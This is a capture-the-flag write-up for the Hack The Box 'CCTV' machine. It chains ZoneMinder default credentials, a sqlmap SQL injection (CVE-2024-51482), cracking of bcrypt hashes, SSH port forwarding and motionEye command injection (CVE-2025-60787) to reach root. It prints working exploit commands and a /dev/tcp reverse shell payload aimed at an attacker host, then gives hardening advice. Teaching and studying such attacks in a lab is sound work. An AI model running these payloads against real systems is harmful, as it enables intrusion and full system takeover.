# CCTV

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | CCTV |
| Difficulty | Easy |
| Operating System | Linux (Ubuntu) |
| IP Address | 10.129.7.157 |

---

## Summary

> CCTV is an Easy Linux machine centered on a surveillance platform attack chain. The main site exposes a ZoneMinder 1.37.63 interface accessible with default credentials (`admin:admin`). The `tid` parameter in ZoneMinder is vulnerable to **CVE-2024-51482** — a time-based blind SQL injection that, when combined with an authenticated session cookie and `sqlmap`, allows full extraction of the `zm.Users` table. The recovered bcrypt hashes are cracked offline with John the Ripper, yielding SSH credentials for `mark`. Post-exploitation reveals a root-owned motionEye service bound exclusively to localhost (port 8765). Application logs expose the motionEye admin password hash, and SSH local port forwarding exposes the web UI to the attacker. motionEye ≤ 0.43.1b4 is vulnerable to **CVE-2025-60787** (CVSS 7.2) — an OS command injection through client-side validation bypass that writes a malicious payload into the Motion config file, executed when Motion restarts. The PoC delivers a reverse shell as root, completing the compromise.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Full TCP port scan — fast SYN scan
nmap -p- --min-rate 5000 -sS 10.129.7.157 -oN nmap/full.txt

# Detailed version/script scan on discovered ports
nmap -sCV -p22,80 10.129.7.157 -oN nmap/services.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
|_http-title: SecureVision – CCTV Monitoring
```

### Open Ports

| Port | Protocol | Service | Version |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 9.2p1 Debian 2+deb12u7 |
| 80 | TCP | HTTP | Apache httpd 2.4.58 (Ubuntu) |

### Notes

> Two ports only. Port 80 serves the SecureVision CCTV monitoring site, which links through to a ZoneMinder instance at `/zm/`. The ZoneMinder dashboard version is visible after login and is the primary attack surface. Wappalyzer identifies the stack as Apache 2.4.58 + Ubuntu + jQuery 3.7.1 + Bootstrap.

---

## 2. Enumeration

### Web Enumeration

```bash
# Add to /etc/hosts
echo "10.129.7.157    cctv.htb" | sudo tee -a /etc/hosts

# Browse the main site
http://cctv.htb/

# ZoneMinder admin panel
http://cctv.htb/zm/
```

> The ZoneMinder login page at `http://cctv.htb/zm/` accepts **default credentials**:
>
> - Username: `admin`  
> - Password: `admin`

> After login, the dashboard footer confirms: **ZoneMinder v1.37.63**. This version is affected by CVE-2024-51482.

```bash
# Retrieve the authenticated session cookie from browser DevTools
# Storage → Cookies → http://cctv.htb
# Cookie name: ZMSESSID
# Example value: tnpi0cm4svk2oa4bk7f5ubd2uk
```

---

## 3. Foothold

### Vulnerability Identified

> **CVE-2024-51482 — ZoneMinder Authenticated Time-Based Blind SQL Injection**  
> The `tid` parameter of `/zm/index.php?view=request&request=event&action=removetag` is not sanitized before being interpolated into a SQL query. An authenticated attacker can inject time-delay payloads to infer database contents character by character. The vulnerability affects ZoneMinder ≤ 1.37.63 and requires a valid session cookie — satisfied here by default credentials.

### Exploitation

```bash
# Use sqlmap with the authenticated session cookie to dump zm.Users
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    -D zm -T Users -C Username,Password --dump --batch \
    --dbms=MySQL --technique=T \
    --cookie="ZMSESSID=<your-session-cookie>" \
    --time-sec=2
```

```
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```

> All three hashes are bcrypt (`$2y$10$`). Save them for offline cracking:

```bash
cat > zm_users_hash.txt << EOF
$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
EOF

# Crack with John the Ripper (bcrypt is slow — use --format=bcrypt explicitly)
john zm_users_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt

# Or with hashcat (mode 3200)
hashcat -m 3200 zm_users_hash.txt /usr/share/wordlists/rockyou.txt
```

> John recovers one password: `mark : opensesame`  
> (The `superadmin` and `admin` hashes do not crack against rockyou.)

### Shell Obtained

> SSH login with the cracked credentials:

```bash
ssh mark@cctv.htb
# Password: opensesame
```

> Shell obtained as `mark`. Note: the user flag is **not** in `/home/mark/` — it is located at `/home/sa_mark/user.txt` (accessible after root or via group permissions).

---

## 4. Lateral Movement

### Discovery — motionEye running as root on localhost

```bash
# Enumerate running processes
ps aux | grep -i motion
# root  ...  /usr/bin/python3 /usr/local/bin/meyectl ... startserver -c /etc/motioneye/motioneye.conf

# Check systemd service
cat /etc/systemd/system/motioneye.service
# Confirms: ExecStart runs as root, bound to 127.0.0.1:8765

# Check ports bound to localhost
ss -tlnp
# Confirms: 127.0.0.1:8765 — motionEye web interface
```

> The motionEye web service is only accessible from localhost. To reach it from the attacker machine, use SSH local port forwarding:

```bash
# Forward attacker's port 8765 to the target's localhost:8765
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

> The motionEye admin panel is now accessible at `http://127.0.0.1:8765` on the attacker machine.

### Recover motionEye admin credentials

```bash
# Inspect the motionEye configuration file
cat /etc/motioneye/motioneye.conf
# Contains: admin_password = 989c5a8ee87a0e9521ec81a79187d162109282f0

# Check application logs for authentication events or API calls
cat /var/log/motioneye/*.log 2>/dev/null
grep -r "admin" /var/log/motioneye/
```

> The motionEye config stores the admin password hash: `989c5a8ee87a0e9521ec81a79187d162109282f0`  
> This is used directly as the credential for the API — no cracking required.

---

## 5. Privilege Escalation

### Enumeration

> motionEye version is confirmed as **≤ 0.43.1b4** (vulnerable to CVE-2025-60787) from the service banner or package info:

```bash
pip3 show motioneye 2>/dev/null || python3 -c "import motioneye; print(motioneye.__version__)"
# or:
grep -r "version" /usr/local/lib/python3*/dist-packages/motioneye/
```

### Vulnerability Identified

> **CVE-2025-60787 — motionEye ≤ 0.43.1b4 Authenticated OS Command Injection via Config Parameter (CVSS 7.2 / High)**  
> motionEye accepts user-supplied values for configuration fields such as `image_file_name` and `movie_file_name` through the web UI. These values are written directly into Motion camera configuration files (`/etc/motioneye/camera-*.conf`) by `config.py → motion_camera_ui_to_dict()` without any server-side sanitization. Client-side JavaScript validation (`configUiValid`) is the only guard — which can be trivially bypassed in the browser console. When motionEye restarts the Motion process (`motionctl.start()`), Motion reads the config and treats these fields as shell-expandable strings, executing any injected shell syntax. Since motionEye runs as root in this deployment, the injected command executes with root privileges. The vulnerability is fixed in version 0.43.1b5, which introduces server-side regex validation via `input_sanity_check()` in `config.py`.

### Exploitation

```bash
# Clone the PoC (BwithE or prabhatverma47 variant)
git clone https://github.com/BwithE/CVE-2025-60787

# Start reverse shell listener
nc -lvnp 4444

# In a separate terminal — ensure SSH tunnel is active:
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb

# Run the exploit (targets the forwarded localhost port)
python3 CVE-2025-60787.py revshell \
    --url 'http://localhost:8765' \
    --user 'admin' \
    --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
    -i <attacker-ip> \
    --port 4444
```

```
[*] Attempting to connect to 'http://localhost:8765' with credentials 'admin:989c5a8ee87a0e9521ec81a79187d162109282f0'
[*] Valid credentials provided
[*] Obtaining cameras available
[*] Found 1 camera(s)
    1) Name: 'CAM 01' ; ID: 1; root_directory: '/var/lib/motioneye/Camera1'
[*] Using camera by default (first one found) for the exploit
[*] Payload successfully injected. Check your shell...
~Happy Hacking
```

> The exploit bypasses client-side JS validation, injects a reverse shell payload into `image_file_name` in `camera-1.conf`, then triggers a Motion restart via the API. Motion reads the poisoned config and executes the shell command as root.

**Manual exploitation (without PoC):**

```bash
# 1. In browser console at http://127.0.0.1:8765 — bypass JS validation:
configUiValid = function() { return true; };

# 2. Navigate to: Settings → Camera 1 → Still Images → Image File Name
# 3. Replace value with reverse shell payload:
$(bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1').%Y-%m-%d-%H-%M-%S

# 4. Click Apply — then restart Motion via the motionEye UI or API:
curl -X POST http://localhost:8765/api/camera/1/config/set \
     -d '{"admin_password":"989c5a8ee87a0e9521ec81a79187d162109282f0"}'
```

### Root / Administrator Access

```bash
root@cctv:/etc/motioneye# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

root@cctv:~# cat /root/root.txt
0a49eb11cf5f239a87632add2e035361
```

---

## 6. Flags

| Flag | Value |
|---|---|
| User | 5fc04055ef7fde4b6b01569d570173b2 |
| Root | 0a49eb11cf5f239a87632add2e035361 |

---

## 7. Lessons Learned

> - **Default credentials on public-facing admin interfaces are unacceptable** — `admin:admin` on ZoneMinder is well-documented and will be among the first credentials any attacker tries. Default credentials must be changed at deployment time, enforced by the installer.
> - **Time-based blind SQLi in ZoneMinder (CVE-2024-51482)** does not require high privileges — only a valid session, which default creds trivially provide. Always test authenticated endpoints for injection even after login is required.
> - **bcrypt is strong but passwords are weak** — John the Ripper cracked `mark`'s bcrypt hash because `opensesame` is in `rockyou.txt`. The algorithm provides no protection against predictable passwords with a sufficient wordlist and time investment. Enforce password policies and check against breach databases.
> - **Service isolation on localhost is not a security boundary** — motionEye bound to `127.0.0.1:8765` appeared inaccessible, but SSH local port forwarding trivially exposes any localhost service. Never treat loopback binding as a security control.
> - **Client-side validation is not a security control** — CVE-2025-60787 exists entirely because motionEye relied on JavaScript (`configUiValid`) to block malicious input. Any attacker can override JS functions in the browser console in seconds. Server-side sanitization is the only valid control.
> - **Running web services as root** — motionEye running as root means any code execution through it is immediately root-level. Service accounts with least-privilege permissions should always be used for daemons.
> - **Credentials in config files** — the motionEye admin password hash in `motioneye.conf` was readable by `mark`. Config files containing authentication material must be `chmod 600` and owned by the service user only.
> - **The flags are in non-standard locations** — user flag under `/home/sa_mark/` rather than `/home/mark/` is an intentional design choice to force root before flag retrieval. Always enumerate all home directories after gaining a foothold.

---

## 8. Mitigation & Hardening

> - **ZoneMinder default credentials**: Change all default credentials immediately after deployment. Implement account lockout after failed login attempts. Restrict the ZoneMinder admin panel to internal/VPN networks only.
> - **CVE-2024-51482 (ZoneMinder SQLi)**: Upgrade ZoneMinder to the latest patched release. Apply parameterized queries and prepared statements throughout all database interaction code. Add WAF rules to detect time-delay SQL injection patterns on ZoneMinder endpoints.
> - **bcrypt + weak passwords**: Enforce a minimum password complexity policy that explicitly blocks dictionary words and common passwords. Integrate with a known-breached password API (HaveIBeenPwned) at registration and password change time.
> - **SSH port forwarding exposure**: Restrict SSH port forwarding in `/etc/ssh/sshd_config` (`AllowTcpForwarding no` or `PermitOpen` allowlist) for unprivileged users. Use firewall rules (iptables/ufw) to restrict access to localhost-bound services per process.
> - **CVE-2025-60787 (motionEye RCE)**: Upgrade motionEye to version 0.43.1b5 or later, which introduces server-side `input_sanity_check()` validation using a strict regex in `config.py → motion_camera_ui_to_dict()`. Until upgrade is possible, restrict admin panel access to trusted IPs only and monitor for unusual Motion config file changes.
> - **Least-privilege service accounts**: Run motionEye (and all daemons) under a dedicated service account with no shell, minimal file permissions, and no sudo rights. Use systemd's `User=`, `ProtectSystem=strict`, and `NoNewPrivileges=true` directives.
> - **Config file permissions**: Any config file containing credentials, hashes, or API keys must be `chmod 600` and readable only by the owning service user. Run `find /etc -world-readable -name "*.conf"` periodically as part of a hardening audit.

---

## References

- [CVE-2024-51482 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-51482)
- [CVE-2024-51482 — ZoneMinder SQL Injection PoC (GitHub)](https://github.com/BwithE/CVE-2024-51482)
- [ZoneMinder Official Documentation](https://zoneminder.readthedocs.io/)
- [CVE-2025-60787 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-60787)
- [CVE-2025-60787 — GitHub Advisory (GHSA-j945-qm58-4gjx)](https://github.com/advisories/GHSA-j945-qm58-4gjx)
- [CVE-2025-60787 — PoC by prabhatverma47](https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter)
- [CVE-2025-60787 — PoC by BwithE (used in this machine)](https://github.com/BwithE/CVE-2025-60787)
- [CVE-2025-60787 — Metasploit Module](https://www.rapid7.com/db/modules/exploit/linux/http/motioneye_auth_rce_cve_2025_60787/)
- [motionEye Project — GitHub](https://github.com/motioneye-project/motioneye)
